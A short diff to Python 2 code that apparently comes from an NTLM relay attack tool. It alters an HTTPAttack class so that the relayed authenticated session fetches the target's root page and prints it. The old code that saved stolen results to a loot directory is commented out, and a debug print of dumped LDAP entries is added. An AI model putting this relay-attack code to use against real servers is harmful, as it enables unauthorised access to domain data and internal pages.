@@ -196,6 +196,7 @@ class LDAPAttack(Thread):
 
     def run(self):
         #self.client.search('dc=vulnerable,dc=contoso,dc=com', '(objectclass=person)')
+        #print self.client.entries
         global dumpedDomain
         #Set up a default config
         domainDumpConfig = self.ldapdomaindump.domainDumpConfig()
@@ -238,21 +239,25 @@ class HTTPAttack(Thread):
 
         #You can also request any page on the server via self.client.session,
         #for example with: 
-        #result = self.client.session.get('http://secretserver/secretpage.html')
-        #print result.content
+        result = self.client.request("GET", "/")
+        r1 = self.client.getresponse()
+        print r1.status, r1.reason
+        data1 = r1.read()
+        print data1
+
 
         #Remove protocol from target name
-        safeTargetName = self.client.target.replace('http://','').replace('https://','')
+        #safeTargetName = self.client.target.replace('http://','').replace('https://','')
 
         #Replace any special chars in the target name
-        safeTargetName = re.sub(r'[^a-zA-Z0-9_\-\.]+', '_', safeTargetName)
+        #safeTargetName = re.sub(r'[^a-zA-Z0-9_\-\.]+', '_', safeTargetName)
 
         #Combine username with filename
-        fileName = re.sub(r'[^a-zA-Z0-9_\-\.]+', '_', self.username.decode('utf-16-le')) + '-' + safeTargetName + '.html'
+        #fileName = re.sub(r'[^a-zA-Z0-9_\-\.]+', '_', self.username.decode('utf-16-le')) + '-' + safeTargetName + '.html'
 
         #Write it to the file
-        with open(os.path.join(self.config.lootdir,fileName),'w') as of:
-            of.write(self.client.lastresult)
+        #with open(os.path.join(self.config.lootdir,fileName),'w') as of:
+        #    of.write(self.client.lastresult)
 
 class IMAPAttack(Thread):
     def __init__(self, config, IMAPClient, username):
